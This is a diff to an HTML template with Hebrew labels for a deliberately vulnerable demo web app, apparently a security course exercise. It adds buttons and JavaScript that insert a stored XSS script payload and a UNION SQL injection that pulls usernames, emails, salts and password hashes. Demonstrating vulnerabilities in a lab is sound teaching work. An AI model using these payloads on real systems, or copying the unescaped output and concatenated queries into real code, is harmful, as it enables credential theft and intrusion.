@@ -94,14 +94,24 @@
 
                 <!-- Stored XSS Exploit Box -->
                 <div class="exploit-card mt-3">
-                    <div class="d-flex align-items-center">
-                        <i class="bi bi-bug-fill text-danger fs-5 me-2"></i>
-                        <strong class="text-danger">הדגמת Stored XSS (סעיף 4 בחלק ב'):</strong>
+                    <div class="d-flex justify-content-between align-items-center mb-1">
+                        <div class="d-flex align-items-center">
+                            <i class="bi bi-bug-fill text-danger fs-5 me-2"></i>
+                            <strong class="text-danger">הדגמת Stored XSS (סעיף 4 בחלק ב'):</strong>
+                        </div>
+                        <div>
+                            <button type="button" class="btn btn-sm btn-outline-secondary py-0 me-1" onclick="copyToClipboard('<script>alert(&quot;Stored XSS - Comunication_LTD!&quot;);<\/script>', this)">
+                                <i class="bi bi-clipboard"></i> העתק פיילוד
+                            </button>
+                            <button type="button" class="btn btn-sm btn-outline-danger py-0" onclick="injectXss()">
+                                <i class="bi bi-arrow-up-circle"></i> הזרק לטופס
+                            </button>
+                        </div>
                     </div>
                     <p class="small text-muted mt-1 mb-2">
-                        שם הלקוח מוצג ישירות ללא סינון (Escape). הכנס בשם הלקוח את הפיילוד הבא:
+                        שם הלקוח מוצג ישירות ללא סינון (Escape). פיילוד להרצה:
                     </p>
-                    <code class="d-block p-1 bg-white border rounded text-break user-select-all small">&lt;script&gt;alert('Stored XSS - Comunication_LTD!');&lt;/script&gt;</code>
+                    <code class="d-block p-2 bg-white border rounded text-break user-select-all small">&lt;script&gt;alert('Stored XSS - Comunication_LTD!');&lt;/script&gt;</code>
                 </div>
             </div>
         </div>
@@ -116,9 +126,9 @@
             </div>
             <div class="card-body">
                 <!-- Search bar vulnerable to SQLi -->
-                <form method="GET" action="{{ url_for('dashboard') }}" class="mb-3">
+                <form method="GET" action="{{ url_for('dashboard') }}" id="searchForm" class="mb-3">
                     <div class="input-group">
-                        <input type="text" class="form-control" name="q" value="{{ search_query }}" placeholder="חיפוש לקוח לפי שם או ת.ז (פגיע ל-SQLi)...">
+                        <input type="text" class="form-control" id="searchInput" name="q" value="{{ search_query }}" placeholder="חיפוש לקוח לפי שם או ת.ז (פגיע ל-SQLi)...">
                         <button class="btn btn-primary" type="submit">
                             <i class="bi bi-search"></i> חפש
                         </button>
@@ -130,14 +140,24 @@
 
                 <!-- SQLi Exploit Box for Section 4 -->
                 <div class="exploit-card mb-3">
-                    <div class="d-flex align-items-center">
-                        <i class="bi bi-terminal-fill text-danger fs-5 me-2"></i>
-                        <strong class="text-danger">הדגמת SQLi בסעיף 4 (חיפוש לקוחות):</strong>
+                    <div class="d-flex justify-content-between align-items-center mb-1">
+                        <div class="d-flex align-items-center">
+                            <i class="bi bi-terminal-fill text-danger fs-5 me-2"></i>
+                            <strong class="text-danger">הדגמת SQLi בסעיף 4 (חיפוש לקוחות):</strong>
+                        </div>
+                        <div>
+                            <button type="button" class="btn btn-sm btn-outline-secondary py-0 me-1" onclick="copyToClipboard('\' UNION SELECT u.id, u.username, u.email, u.salt, u.password_hash, \'סקטור\', \'חבילה\', \'סיסמה מוצפנת ב-HMAC\' FROM users u --', this)">
+                                <i class="bi bi-clipboard"></i> העתק פיילוד
+                            </button>
+                            <button type="button" class="btn btn-sm btn-outline-danger py-0" onclick="injectSqliSearch()">
+                                <i class="bi bi-search"></i> הזרק לחיפוש
+                            </button>
+                        </div>
                     </div>
                     <p class="small text-muted mt-1 mb-1">
                         השאילתה משרשרת את החיפוש: <code>WHERE c.full_name LIKE '%{q}%'</code>. נסה UNION Injection להדלפת המשתמשים:
                     </p>
-                    <code class="d-block p-1 bg-white border rounded text-break user-select-all small">' UNION SELECT u.id, u.username, u.email, u.salt, u.password_hash, 'סקטור', 'חבילה', 'סיסמה מוצפנת ב-HMAC' FROM users u --</code>
+                    <code class="d-block p-2 bg-white border rounded text-break user-select-all small">' UNION SELECT u.id, u.username, u.email, u.salt, u.password_hash, 'סקטור', 'חבילה', 'סיסמה מוצפנת ב-HMAC' FROM users u --</code>
                 </div>
 
                 <!-- Table of Customers -->
@@ -180,4 +200,21 @@
         </div>
     </div>
 </div>
+
+<script>
+function injectXss() {
+    var payload = '<script>alert("Stored XSS - Comunication_LTD!");<\/script>';
+    document.getElementById('full_name').value = payload;
+    document.getElementById('identity_number').value = '987654321';
+    document.getElementById('phone').value = '050-9998877';
+    document.getElementById('email').value = 'xss@test.com';
+    document.getElementById('notes').value = 'Payload injected successfully';
+}
+
+function injectSqliSearch() {
+    var payload = "' UNION SELECT u.id, u.username, u.email, u.salt, u.password_hash, 'סקטור', 'חבילה', 'סיסמה מוצפנת ב-HMAC' FROM users u --";
+    document.getElementById('searchInput').value = payload;
+    document.getElementById('searchForm').submit();
+}
+</script>
 {% endblock %}
